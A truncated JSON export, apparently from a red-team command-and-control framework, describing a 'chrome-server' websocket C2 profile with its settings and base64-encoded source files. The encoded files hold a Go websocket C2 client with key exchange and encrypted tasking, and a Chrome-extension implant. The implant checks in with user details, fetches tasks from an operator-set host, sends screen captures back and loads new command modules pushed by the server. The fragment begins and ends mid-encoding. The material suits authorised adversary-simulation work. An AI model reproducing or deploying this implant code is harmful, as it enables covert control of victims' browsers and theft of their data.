za1Jlc3BvbnNlcyA9IGFwcGVuZChUYXNrUmVzcG9uc2VzLCBmaW5hbEVuYykKCW11LlVubG9jaygpCn0KCmZ1bmMgKGMgKkMyV2Vic29ja2V0cykgTmVnb3RpYXRlS2V5KCkgc3RyaW5nIHsKCXNlc3Npb25JRCA6PSBHZW5lcmF0ZVNlc3Npb25JRCgpCglwdWIsIHByaXYgOj0gY3J5cHRvLkdlbmVyYXRlUlNBS2V5UGFpcigpCgljLlJzYVByaXZhdGVLZXkgPSBwcml2CgkvL2luaXRNZXNzYWdlIDo9IHN0cnVjdHMuRUtFSW5pdHt9Cglpbml0TWVzc2FnZSA6PSBzdHJ1Y3RzLkVrZUtleUV4Y2hhbmdlTWVzc2FnZXt9Cglpbml0TWVzc2FnZS5BY3Rpb24gPSAic3RhZ2luZ19yc2EiCglpbml0TWVzc2FnZS5TZXNzaW9uSUQgPSBzZXNzaW9uSUQKCWluaXRNZXNzYWdlLlB1YktleSA9IGJhc2U2NC5TdGRFbmNvZGluZy5FbmNvZGVUb1N0cmluZyhwdWIpCgoJLy8gRW5jb2RlIGFuZCBlbmNyeXB0IHRoZSBqc29uIG1lc3NhZ2UKCXJhdywgZXJyIDo9IGpzb24uTWFyc2hhbChpbml0TWVzc2FnZSkKCglpZiBlcnIgIT0gbmlsIHsKCQkvL2xvZy5QcmludGYoIkVycm9yIG1hcnNoYWxpbmcgZGF0YTogJXMiLCBlcnIuRXJyb3IoKSkKCQlyZXR1cm4gIiIKCX0KCgkvL2xvZy5QcmludGYoIlNlbmRpbmcgRUtFIG1zZzogJSt2XG4iLCBpbml0TWVzc2FnZSkKCXJlc3AgOj0gYy5zZW5kRGF0YSgiIiwgcmF3KQoKCS8vZGVjcnlwdGVkUmVzcG9uc2UgOj0gY3J5cHRvLlJzYURlY3J5cHRDaXBoZXJCeXRlcyhyZXNwLCBjLlJzYVByaXZhdGVLZXkpCglzZXNzaW9uS2V5UmVzcCA6PSBzdHJ1Y3RzLkVrZUtleUV4Y2hhbmdlTWVzc2FnZVJlc3BvbnNle30KCgllcnIgPSBqc29uLlVubWFyc2hhbChyZXNwLCAmc2Vzc2lvbktleVJlc3ApCglpZiBlcnIgIT0gbmlsIHsKCQkvL2xvZy5QcmludGYoIkVycm9yIHVubWFyc2hhbGluZyBSc2FSZXNwb25zZSAlcyIsIGVyci5FcnJvcigpKQoJCXJldHVybiAiIgoJfQoKCS8vbG9nLlByaW50ZigiUmVjZWl2ZWQgRUtFIHJlc3BvbnNlOiAlK3ZcbiIsIHNlc3Npb25LZXlSZXNwKQoJLy8gU2F2ZSB0aGUgbmV3IEFFUyBzZXNzaW9uIGtleQoJZW5jcnlwdGVkU2VzaW9uS2V5LCBfIDo9IGJhc2U2NC5TdGRFbmNvZGluZy5EZWNvZGVTdHJpbmcoc2Vzc2lvbktleVJlc3AuU2Vzc2lvbktleSkKCWRlY3J5cHRlZEtleSA6PSBjcnlwdG8uUnNhRGVjcnlwdENpcGhlckJ5dGVzKGVuY3J5cHRlZFNlc2lvbktleSwgYy5Sc2FQcml2YXRlS2V5KQoJYy5LZXkgPSBiYXNlNjQuU3RkRW5jb2RpbmcuRW5jb2RlVG9TdHJpbmcoZGVjcnlwdGVkS2V5KSAvLyBTYXZlIHRoZSBuZXcgQUVTIHNlc3Npb24ga2V5CgljLkV4Y2hhbmdpbmdLZXlzID0gZmFsc2UKCglpZiBsZW4oc2Vzc2lvbktleVJlc3AuVVVJRCkgPiAwIHsKCQljLkFwZmVsbElEID0gc2Vzc2lvbktleVJlc3AuVVVJRAoJfQoKCXJldHVybiBzZXNzaW9uSUQKCn0KCmZ1bmMgKGMgKkMyV2Vic29ja2V0cykgc2VuZERhdGEodGFnIHN0cmluZywgc2VuZERhdGEgW11ieXRlKSBbXWJ5dGUgewoJbSA6PSBzdHJ1Y3RzLk1lc3NhZ2V7fQoKCWZvciB0cnVlewoJCWlmIGxlbihjLktleSkgIT0gMCB7CgkJCXNlbmREYXRhID0gYy5lbmNyeXB0TWVzc2FnZShzZW5kRGF0YSkKCQl9CgkKCQlzZW5kRGF0YSA9IGFwcGVuZChbXWJ5dGUoYy5BcGZlbGxJRCksIHNlbmREYXRhLi4uKQoJCXNlbmREYXRhID0gW11ieXRlKGJhc2U2NC5TdGRFbmNvZGluZy5FbmNvZGVUb1N0cmluZyhzZW5kRGF0YSkpCgkKCQltLkNsaWVudCA9IHRydWUKCQltLkRhdGEgPSBzdHJpbmcoc2VuZERhdGEpCgkJbS5UYWcgPSB0YWcKCQkvL2xvZy5QcmludGYoIlNlbmRpbmcgbWVzc2FnZSAlK3ZcbiIsIG0pCgkJZXJyIDo9IGMuQ29ubi5Xcml0ZUpTT04obSkKCQlpZiBlcnIgIT0gbmlsIHsKCQkJdGltZS5TbGVlcCh0aW1lLkR1cmF0aW9uKGMuZ2V0U2xlZXBUaW1lKCkpICogdGltZS5TZWNvbmQpOwoJCQljb250aW51ZQoJCX0KCQkvLyBSZWFkIHRoZSByZXNwb25zZQoJCXJlc3AgOj0gc3RydWN0cy5NZXNzYWdle30KCQllcnIgPSBjLkNvbm4uUmVhZEpTT04oJnJlc3ApCgkKCQlpZiBlcnIgIT0gbmlsIHsKCQkJLy9sb2cuUHJpbnRsbigiRXJyb3IgdHJ5aW5nIHRvIHJlYWQgbWVzc2FnZSAiLCBlcnIuRXJyb3IoKSkKCQkJdGltZS5TbGVlcCh0aW1lLkR1cmF0aW9uKGMuZ2V0U2xlZXBUaW1lKCkpICogdGltZS5TZWNvbmQpOwoJCQljb250aW51ZQoJCX0KCQoJCXJhdywgZXJyIDo9IGJhc2U2NC5TdGRFbmNvZGluZy5EZWNvZGVTdHJpbmcocmVzcC5EYXRhKQoJCWlmIGVyciAhPSBuaWwgewoJCQkvL2xvZy5QcmludGxuKCJFcnJvciBkZWNvZGluZyBiYXNlNjQgZGF0YTogIiwgZXJyLkVycm9yKCkpCgkJCXJldHVybiBtYWtlKFtdYnl0ZSwgMCkKCQl9CgoJCWlmIGxlbihyYXcpID09IDAgewoJCQl0aW1lLlNsZWVwKHRpbWUuRHVyYXRpb24oYy5nZXRTbGVlcFRpbWUoKSkgKiB0aW1lLlNlY29uZCk7CiAgICAgICAgICAgIGNvbnRpbnVlCgkJfQoJCgkJZW5jX3JhdyA6PSByYXdbMzY6XSAvLyBSZW1vdmUgdGhlIFBheWxvYWQgVVVJRAoJCgkJaWYgbGVuKGMuS2V5KSAhPSAwIHsKCQkJLy9sb2cuUHJpbnRmKCJEZWNyeXB0aW5nIGRhdGEiKQoJCQllbmNfcmF3ID0gYy5kZWNyeXB0TWVzc2FnZShlbmNfcmF3KQoJCQlpZiBsZW4oZW5jX3JhdykgPT0gMCB7CgkJCQl0aW1lLlNsZWVwKHRpbWUuRHVyYXRpb24oYy5nZXRTbGVlcFRpbWUoKSkgKiB0aW1lLlNlY29uZCk7CiAgICAgICAgICAgICAgICBjb250aW51ZQoJCQl9CgkJfQoJCgkJcmV0dXJuIGVuY19yYXcKCX0KCQoJcmV0dXJuIG1ha2UoW11ieXRlLCAwKQp9CgoKZnVuYyAoYyAqQzJXZWJzb2NrZXRzKSBlbmNyeXB0TWVzc2FnZShtc2cgW11ieXRlKSBbXWJ5dGUgewoJa2V5LCBfIDo9IGJhc2U2NC5TdGRFbmNvZGluZy5EZWNvZGVTdHJpbmcoYy5LZXkpCglyZXR1cm4gY3J5cHRvLkFlc0VuY3J5cHQoa2V5LCBtc2cpCn0KCmZ1bmMgKGMgKkMyV2Vic29ja2V0cykgZGVjcnlwdE1lc3NhZ2UobXNnIFtdYnl0ZSkgW11ieXRlIHsKCWtleSwgXyA6PSBiYXNlNjQuU3RkRW5jb2RpbmcuRGVjb2RlU3RyaW5nKGMuS2V5KQoJcmV0dXJuIGNyeXB0by5BZXNEZWNyeXB0KGtleSwgbXNnKQp9"
            }
          ]
        }
      ]
    },
    {
      "description": "Chrome Extension C2 server",
      "running": true,
      "container_running": true,
      "external": false,
      "author": "@xorrior",
      "is_p2p": false,
      "is_server_routed": false,
      "sampleServer": "",
      "sampleClient": "",
      "notes": "The c2config.json file is what configures the 'server' file within the docker container. Adjust the config file according what options you would like. The chrome-server profile leverages websockets for communications with its agents. Both cert.pem and key.pem are required for SSL. If these files are not preset, the server will generate self-signed certificates. The chrome-extension payload, may or may not work with self-signed certificates. ",
      "deleted": false,
      "creation_time": "03\/10\/2020 13:31:05",
      "last_heartbeat": "03\/10\/2020 15:44:17",
      "name": "chrome-server",
      "icon": null,
      "params": [
        {
          "name": "Port",
          "key": "PORT_REPLACE",
          "hint": "8080",
          "randomize": false,
          "format_string": ""
        },
        {
          "name": "Interval",
          "key": "INTERVAL_REPLACE",
          "hint": "5",
          "randomize": false,
          "format_string": ""
        },
        {
          "name": "Host",
          "key": "HOST_REPLACE",
          "hint": "192.168.1.1",
          "randomize": false,
          "format_string": ""
        },
        {
          "name": "Use SSL (true|false)",
          "key": "SSL_REPLACE",
          "hint": "false",
          "randomize": false,
          "format_string": ""
        }
      ],
      "payload_types": [
        {
          "name": "chrome-extension",
          "files": [
            {
              "chrome-server.js": "Ly8tLS0tLS0tLS0tLS0tIENocm9tZSBFeHRlbnNpb24gV2Vic29ja2V0IEMyIG1lY2hhbmlzbXMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCi8vIERpY3Rpb25hcnkgdGhhdCBob2xkcyBvdXRib3VuZCBtZXNzYWdlcwp2YXIgb3V0ID0gW107CmxldCBzY3JlZW5jYXB0dXJlcyA9IFtdOwpsZXQgbG9nZ2VyID0gIiI7CmxldCBsb2FkcyA9IFtdOwpjbGFzcyBjdXN0b21DMiBleHRlbmRzIGJhc2VDMnsKICAgIGNvbnN0cnVjdG9yKGhvc3QsIHBvcnQsIGVuZHBvaW50LCBzc2wgLCBpbnRlcnZhbCl7CiAgICAgICAgc3VwZXIoaG9zdCwgcG9ydCwgZW5kcG9pbnQsIHNzbCwgaW50ZXJ2YWwpOwogICAgICAgIHRoaXMuaG9zdCA9IGhvc3Q7CiAgICAgICAgdGhpcy5wb3J0ID0gcG9ydDsKICAgICAgICB0aGlzLmVuZHBvaW50ID0gZW5kcG9pbnQ7CiAgICAgICAgdGhpcy5pbnRlcnZhbCA9IGludGVydmFsOwogICAgICAgIHRoaXMuY29tbWFuZHMgPSB7fTsKCiAgICAgICAgaWYgKHNzbCA9PT0gdHJ1ZSl7CiAgICAgICAgICAgIHRoaXMucHJvdG8gPSAnd3NzOi8vJzsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICB0aGlzLnByb3RvID0gJ3dzOi8vJzsKICAgICAgICB9CgogICAgICAgIHRoaXMuc2VydmVyID0gYCR7dGhpcy5wcm90b30ke3RoaXMuaG9zdH06JHt0aGlzLnBvcnR9LyR7dGhpcy5lbmRwb2ludH1gOwogICAgfQoKICAgIGdldENvbmZpZygpIHsKICAgICAgICByZXR1cm4gSlNPTi5zdHJpbmdpZnkoeydzZXJ2ZXInOiB0aGlzLnNlcnZlciwgJ2ludGVydmFsJzp0aGlzLmludGVydmFsLCAnY29tbWFuZHMnOiBKU09OLnN0cmluZ2lmeSh0aGlzLmNvbW1hbmRzKX0pOwogICAgfQoKICAgIGNoZWNrSW4oKSB7CiAgICAgICAgY29uc3QgbXNnID0gewogICAgICAgICAgICAiYWN0aW9uIjoiY2hlY2tpbiIsCiAgICAgICAgICAgICJvcyI6aG9zdG9zLAogICAgICAgICAgICAiYXJjaGl0ZWN0dXJlIjogaG9zdGFyY2gsCiAgICAgICAgICAgICJ1c2VyIjphcGZlbGwudXNlcmluZm8sCiAgICAgICAgICAgICJ1dWlkIjphcGZlbGwudXVpZCwKICAgICAgICAgICAgImhvc3QiOmFwZmVsbC51c2VyaW5mbyArICIncyBjaHJvbWUiLAogICAgICAgICAgICAicGlkIjowLAogICAgICAgICAgICAiaXAiOicxMjcuMC4wLjEnLAogICAgICAgIH07CgogICAgICAgIGxldCBjaGVja2luID0gSlNPTi5zdHJpbmdpZnkobXNnKTsKICAgICAgICBsZXQgY2hlY2tpbnBheWxvYWQgPSBhcGZlbGwudXVpZCArIGNoZWNraW47CgogICAgICAgIGNvbnN0IG1ldGEgPSB7CiAgICAgICAgICAgICJjbGllbnQiOiB0cnVlLAogICAgICAgICAgICAiZGF0YSI6IGJ0b2EodW5lc2NhcGUoZW5jb2RlVVJJQ29tcG9uZW50KGNoZWNraW5wYXlsb2FkKSkpLAogICAgICAgICAgICAidGFnIjoiIiwKICAgICAgICB9OwoKICAgICAgICBjb25zdCBlbmNtc2cgPSBKU09OLnN0cmluZ2lmeShtZXRhKTsKICAgICAgICBjb25uZWN0aW9uLnNlbmQoZW5jbXNnKTsKICAgICAgICAvL2NvbnNvbGUubG9nKCdTZW50IGluaXRpYWwgY2hlY2tpbicpOwogICAgfQoKICAgIHBvc3RSZXNwb25zZSgpewogICAgICAgIGlmIChvdXQubGVuZ3RoID4gMCl7CiAgICAgICAgICAgIC8vIFBvcCBhbmQgc2VuZCBhIG1lc3NhZ2UgdG8gdGhlIGNvbnRyb2xsZXIKICAgICAgICAgICAgd2hpbGUgKG91dC5sZW5ndGggPiAwKSB7CiAgICAgICAgICAgICAgICBjb25zdCBtc2cgPSBvdXQuc2hpZnQoKTsKICAgICAgICAgICAgICAgIGNvbnN0IG1ldGEgPSB7CiAgICAgICAgICAgICAgICAgICAgImNsaWVudCI6dHJ1ZSwKICAgICAgICAgICAgICAgICAgICAiZGF0YSI6IG1zZywKICAgICAgICAgICAgICAgICAgICAidGFnIjoiIgogICAgICAgICAgICAgICAgfTsKICAgICAgICAgICAgICAgIGxldCBmaW5hbCA9IEpTT04uc3RyaW5naWZ5KG1ldGEpOwogICAgICAgICAgICAgICAgY29ubmVjdGlvbi5zZW5kKGZpbmFsKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKLy8tLS0tLS0tLS0tLS0tIElOU1RBTlRJQVRFIE9VUiBDMiBDTEFTUyBCRUxPVyBIRVJFIElOIE1BSU4gQ09ERS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCmNvbnN0IEMyID0gbmV3IGN1c3RvbUMyKCdIT1NUX1JFUExBQ0UnLCAgUE9SVF9SRVBMQUNFLCAnd2Vic29ja2V0JywgU1NMX1JFUExBQ0UsIElOVEVSVkFMX1JFUExBQ0UpOwpjb25zdCBjb25uZWN0aW9uICA9IG5ldyBXZWJTb2NrZXQoYCR7QzIuc2VydmVyfWApOwoKZnVuY3Rpb24gY2h1bmtBcnJheShhcnJheSwgc2l6ZSkgewogICAgaWYoYXJyYXkubGVuZ3RoIDw9IHNpemUpewogICAgICAgIHJldHVybiBbYXJyYXldOwogICAgfQoKICAgIHJldHVybiBbYXJyYXkuc2xpY2UoMCxzaXplKSwgLi4uY2h1bmtBcnJheShhcnJheS5zbGljZShzaXplKSwgc2l6ZSldOwp9CgpmdW5jdGlvbiBjMmxvb3AoKSB7CiAgICBDMi5wb3N0UmVzcG9uc2UoKTsKICAgIGlmIChhcGZlbGwuYXBmZWxsaWQubGVuZ3RoICE9PSAwKSB7CiAgICAgICAgbGV0IHJlcXVlc3QgPSB7J2FjdGlvbic6J2dldF90YXNraW5nJywgJ3Rhc2tpbmdfc2l6ZSc6IC0xLCAnZGVsZWdhdGVzJzpbXX07CiAgICAgICAgbGV0IG1zZyA9IEpTT04uc3RyaW5naWZ5KHJlcXVlc3QpOwogICAgICAgIGxldCBmaW5hbCA9IGFwZmVsbC5hcGZlbGxpZCArIG1zZzsKICAgICAgICBsZXQgZW5jZmluYWwgPSBidG9hKHVuZXNjYXBlKGVuY29kZVVSSUNvbXBvbmVudChmaW5hbCkpKTsKICAgICAgICBvdXQucHVzaChlbmNmaW5hbCk7CiAgICB9IGVsc2UgewogICAgICAgIC8vY29uc29sZS5sb2coJ0FwZmVsbCBpZCBub3Qgc2V0IGZvciB0YXNraW5nICcgKyBhcGZlbGwuYXBmZWxsaWQpOwogICAgfQp9Cgp2YXIgbWFpbmxvb3AgPSBzZXRJbnRlcnZhbChjMmxvb3AsIEMyLmludGVydmFsICogMTAwMCk7Cgpjb25uZWN0aW9uLm9ub3BlbiA9IGZ1bmN0aW9uICgpIHsKICAgIEMyLmNoZWNrSW4oKTsKfTsKCmNvbm5lY3Rpb24ub25jbG9zZSA9IGZ1bmN0aW9uICgpIHsKICAgIC8vIERvIE5vdGhpbmcKfTsKCmNvbm5lY3Rpb24ub25lcnJvciA9IGZ1bmN0aW9uICgpIHsKICAgIC8vIERvIE5vdGhpbmcKfTsKCmNvbm5lY3Rpb24ub25tZXNzYWdlID0gZnVuY3Rpb24gKGUpIHsKICAgIGNvbnN0IHJhd21zZyA9IEpTT04ucGFyc2UoZS5kYXRhKTsKICAgIGNvbnN0IGRlY29kZWQgPSBhdG9iKHJhd21zZy5kYXRhKTsKICAgIGNvbnN0IG1lc3NhZ2Vub3V1aWQgPSBkZWNvZGVkLnNsaWNlKDM2LCBkZWNvZGVkLmxlbmd0aCk7CgogICAgY29uc3QgbWVzc2FnZSA9IEpTT04ucGFyc2UobWVzc2FnZW5vdXVpZCk7CiAgICBzd2l0Y2ggKG1lc3NhZ2UuYWN0aW9uKSB7CiAgICAgICAgY2FzZSAnY2hlY2tpbic6IHsKICAgICAgICAgICAgLy8gY2FsbGJhY2sgY2hlY2sgaW4KICAgICAgICAgICAgYXBmZWxsLmFwZmVsbGlkID0gbWVzc2FnZS5pZDsKICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgfQogICAgICAgIGNhc2UgJ2dldF90YXNraW5nJyA6IHsKICAgICAgICAgICAgLy8gaGFuZGxlIGFuIGFwZmVsbCBtZXNzYWdlCgogICAgICAgICAgICBmb3IgKGxldCBpbmRleCA9IDA7IGluZGV4IDwgbWVzc2FnZS50YXNrcy5sZW5ndGg7IGluZGV4KyspIHsKICAgICAgICAgICAgICAgIGNvbnN0IHRhc2sgPSBtZXNzYWdlLnRhc2tzW2luZGV4XTsKCiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgIGNvbW1hbmRzX2RpY3RbdGFzay5jb21tYW5kXSh0YXNrKTsKICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgICAgICAgICAgICAgbGV0IHJlc3BvbnNlID0geyd0YXNrX2lkJzp0YXNrLmlkLCAnY29tcGxldGVkJzpmYWxzZSwgJ3N0YXR1cyc6J2Vycm9yJywgJ2Vycm9yJzonZXJyb3IgcHJvY2Vzc2luZyB0YXNrIGZvciBpZCAnICsgdGFzay5pZCArICdcbicgKyBlcnJvci50b1N0cmluZygpfTsKICAgICAgICAgICAgICAgICAgICBsZXQgb3V0ZXJfcmVzcG9uc2UgPSB7J2FjdGlvbic6J3Bvc3RfcmVzcG9uc2UnLCdyZXNwb25zZXMnOltyZXNwb25zZV0sICdkZWxlZ2F0ZXMnOltdfTsKICAgICAgICAgICAgICAgICAgICBsZXQgbXNnID0gYnRvYSh1bmVzY2FwZShlbmNvZGVVUklDb21wb25lbnQoYXBmZWxsLmFwZmVsbGlkICsgSlNPTi5zdHJpbmdpZnkob3V0ZXJfcmVzcG9uc2UpKSkpOwogICAgICAgICAgICAgICAgICAgIG91dC5wdXNoKG1zZyk7CiAgICAgICAgICAgICAgICAgICAgLy9jb25zb2xlLmxvZygiRXJyb3IgZXhlY3V0aW5nIHRhc2s6ICIgKyBlcnJvci50b1N0cmluZygpKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQoKICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgfQogICAgICAgIGNhc2UgJ3Bvc3RfcmVzcG9uc2UnIDogewogICAgICAgICAgICBmb3IgKGxldCBpbmRleCA9IDA7IGluZGV4IDwgbWVzc2FnZS5yZXNwb25zZXMubGVuZ3RoOyBpbmRleCsrKSB7CiAgICAgICAgICAgICAgICBsZXQgcmVzcG9uc2UgPSBtZXNzYWdlLnJlc3BvbnNlc1tpbmRleF07CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC8vIGNoZWNrIGZvciBzY3JlZW5jYXB0dXJlcyAKICAgICAgICAgICAgICAgIGlmIChzY3JlZW5jYXB0dXJlcy5sZW5ndGggPiAwKSB7CiAgICAgICAgICAgICAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBzY3JlZW5jYXB0dXJlcy5sZW5ndGg7IGkrKykgewogICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBjYXB0dXJlID0gc2NyZWVuY2FwdHVyZXNbaV07CiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBlcXVhbCA9IHJlc3BvbnNlLnRhc2tfaWQubG9jYWxlQ29tcGFyZShjYXB0dXJlLnRhc2tfaWQpOwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoZXF1YWwgPT09IDApIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIFRPRE86IGNodW5rIHRoZSBzY3JlZW5jYXB0dXJlIGRhdGEKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCByYXcgPSBjYXB0dXJlLmltYWdlOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCByZXNwID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjaHVua19udW0nOiAxLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdmaWxlX2lkJzogcmVzcG9uc2UuZmlsZV9pZCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2h1bmtfZGF0YSc6IHJhdywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAndGFza19pZCc6IGNhcHR1cmUudGFza19pZCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH07CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IG91dGVyX3Jlc3BvbnNlID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdhY3Rpb24nOidwb3N0X3Jlc3BvbnNlJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAncmVzcG9uc2VzJzpbcmVzcF0sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2RlbGVnYXRlcyc6W10KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH07CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGVuYyA9IEpTT04uc3RyaW5naWZ5KG91dGVyX3Jlc3BvbnNlKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBmaW5hbCA9IGFwZmVsbC5hcGZlbGxpZCArIGVuYzsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBtc2cgPSBidG9hKHVuZXNjYXBlKGVuY29kZVVSSUNvbXBvbmVudChmaW5hbCkpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG91dC5wdXNoKG1zZyk7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVzcG9uc2UgPSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3Rhc2tfaWQnOnJlc3BvbnNlLnRhc2tfaWQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3VzZXJfb3V0cHV0Jzonc2NyZWVuY2FwdHVyZSBjb21wbGV0ZScsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NvbXBsZXRlJzp0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9OwogICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBvdXRlcl9yZXNwb25zZSA9IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnYWN0aW9uJzoncG9zdF9yZXNwb25zZScsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3Jlc3BvbnNlcyc6W3Jlc3BvbnNlXSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZGVsZWdhdGVzJzpbXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmMgPSBKU09OLnN0cmluZ2lmeShvdXRlcl9yZXNwb25zZSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaW5hbCA9IGFwZmVsbC5hcGZlbGxpZCArIGVuYzsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1zZyA9IGJ0b2EodW5lc2NhcGUoZW5jb2RlVVJJQ29tcG9uZW50KGZpbmFsKSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgb3V0LnB1c2gobXNnKTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzY3JlZW5jYXB0dXJlc1tpXSA9IHt9OwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHNjcmVlbmNhcHR1cmVzLmxlbmd0aCA9PT0gMSApIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzY3JlZW5jYXB0dXJlcyA9IFtdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CgogICAgICAgICAgICBicmVhazsKICAgICAgICB9CiAgICAgICAgY2FzZSAndXBsb2FkJyA6IHsKICAgICAgICAgICAgLy8gY2hlY2sgZm9yIGxvYWQgY29tbWFuZCByZXNwb25zZXMKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIChsb2Fkcy5sZW5ndGggPiAwKSB7CiAgICAgICAgICAgICAgICBmb3IgKGxldCBqID0gMDsgaiA8IGxvYWRzLmxlbmd0aDsgaisrKSB7CiAgICAgICAgICAgICAgICAgICAgbGV0IGVxdWFsID0gbWVzc2FnZS5maWxlX2lkLmxvY2FsZUNvbXBhcmUobG9hZHNbal0uZmlsZV9pZCk7CiAgICAgICAgICAgICAgICAgICAgaWYgKGVxdWFsID09PSAwKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBsb2FkID0gbG9hZHNbal07CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChtZXNzYWdlLmNodW5rX251bSA8IG1lc3NhZ2UudG90YWxfY2h1bmtzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgcmF3ID0gYXRvYihtZXNzYWdlLmNodW5rX2RhdGEpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9hZC5kYXRhLnB1c2goLi4ucmF3KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvYWRzW2pdID0gbG9hZDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCByZXNwID0geydhY3Rpb24nOid1cGxvYWQnLCdjaHVua19zaXplJzogMTAyNDAwMCwgJ2NodW5rX251bSc6KG1lc3NhZ2UuY2h1bmtfbnVtICsgMSksICdmaWxlX2lkJzpsb2FkLmZpbGVfaWQsICdmdWxsX3BhdGgnOicnfTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBlbmNvZGVkUmVzcG9uc2UgPSBKU09OLnN0cmluZ2lmeShyZXNwKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBmaW5hbCA9IGFwZmVsbC5hcGZlbGxpZCArIGVuY29kZWRSZXNwb25zZTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBtc2cgPSBidG9hKHVuZXNjYXBlKGVuY29kZVVSSUNvbXBvbmVudChmaW5hbCkpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG91dC5wdXNoKG1zZyk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAobWVzc2FnZS5jaHVua19udW0gPT09IG1lc3NhZ2UudG90YWxfY2h1bmtzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgcmF3ID0gYXRvYihtZXNzYWdlLmNodW5rX2RhdGEpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9hZC5kYXRhLnB1c2goLi4ucmF3KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBuZXdfZGljdCA9IGRlZmF1bHRfbG9hZChsb2FkLmRhdGEuam9pbigiIikpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZHNfZGljdCA9IE9iamVjdC5hc3NpZ24oe30sIGNvbW1hbmRzX2RpY3QsIG5ld19kaWN0KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vY29uc29sZS5sb2coT2JqZWN0LnZhbHVlcyhjb21tYW5kc19kaWN0KSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBDMi5jb21tYW5kcyA9IE9iamVjdC5rZXlzKGNvbW1hbmRzX2RpY3QpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHJlc3BvbnNlID0geyd0YXNrX2lkJzpsb2FkLnRhc2tfaWQsICd1c2VyX291dHB1dCc6IGxvYWQubmFtZSArICIgbG9hZGVkIiwgImNvbXBsZXRlZCI6dHJ1ZX07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgb3V0ZXJfcmVzcG9uc2UgPSB7J2FjdGlvbic6J3Bvc3RfcmVzcG9uc2UnLCAncmVzcG9uc2VzJzpbcmVzcG9uc2VdLCAnZGVsZWdhdGVzJzpbXX07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgZW5jID0gSlNPTi5zdHJpbmdpZnkob3V0ZXJfcmVzcG9uc2UpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGZpbmFsID0gYXBmZWxsLmFwZmVsbGlkICsgZW5jOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IG1zZyA9IGJ0b2E